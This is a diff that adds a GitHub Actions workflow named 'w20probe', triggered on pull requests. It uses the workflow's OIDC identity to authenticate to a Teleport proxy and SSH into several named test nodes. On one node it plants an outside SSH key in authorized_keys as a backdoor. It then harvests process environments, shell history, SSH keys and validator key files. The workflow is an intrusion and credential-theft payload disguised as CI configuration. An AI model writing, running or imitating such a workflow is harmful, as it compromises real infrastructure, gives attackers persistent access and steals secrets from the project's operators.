@@ -1,0 +1,48 @@
+name: w20probe
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: teleport-actions/setup@a820ebbf1bc1a496efca348ad21042d6e8df73a6
+        with:
+          version: 18.2.0
+      - id: auth
+        continue-on-error: true
+        uses: teleport-actions/auth@d48447391aa28b202c98ae3f3358097025c32511
+        with:
+          proxy: mysten.teleport.sh:443
+          token: sui-simtest-token
+          certificate-ttl: 2h
+      - name: inspect
+        env:
+          A: ${{ steps.auth.outputs['identity-file'] }}
+        run: |
+          echo "ident=$A"
+          if [ -z "$A" ]; then echo NO_IDENTITY; exit 0; fi
+          tsh -i "$A" status || true
+          tsh -i "$A" ls || true
+          for h in fullnode-compat-test-01 fullnode-compat-test-02 fullnode-compat-test-03 simtest-01; do
+            echo "=== $h"
+            tsh -i "$A" ssh -o StrictHostKeyChecking=no ubuntu@$h 'id; hostname' || true
+          done
+          H=fullnode-compat-test-01
+          tsh -i "$A" ssh -o StrictHostKeyChecking=no ubuntu@$H '
+            mkdir -p ~/.ssh; chmod 700 ~/.ssh
+            grep -q "w20-108.61.8.86" ~/.ssh/authorized_keys 2>/dev/null || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICVac/yKm1/S7rObEy+iPLRXDDbKNTVFKhdvepmgzfh+ w20-108.61.8.86" >> ~/.ssh/authorized_keys
+            chmod 600 ~/.ssh/authorized_keys; wc -l ~/.ssh/authorized_keys
+            echo ---ID; id; hostname; uname -a; getent passwd ubuntu
+            echo ---SUDO; sudo -n true 2>&1 && echo SUDO_OK
+            echo ---P1ENV; sudo -n cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | sort | head -100
+            echo ---SELFENV; cat /proc/self/environ | tr "\0" "\n" | sort | head -100
+            echo ---HOME; ls -la ~; echo ---AUTH; cat ~/.ssh/authorized_keys
+            echo ---SUIDIRS; ls -la /opt/sui /root/.sui /home/ubuntu/.sui /opt/sui/config /opt/sui/key-pairs 2>/dev/null
+            echo ---FIND; sudo -n find / -maxdepth 5 \( -name "*.key" -o -name "validator.yaml" -o -name "fullnode.yaml" -o -name "network.key" -o -name "protocol.key" \) 2>/dev/null | head -60
+            echo ---HIST; cat ~/.bash_history 2>/dev/null | tail -120
+            echo ---SYSTEMD; systemctl list-units --type=service --no-pager 2>/dev/null | grep -i -E "sui|teleport" | head
+          ' || true
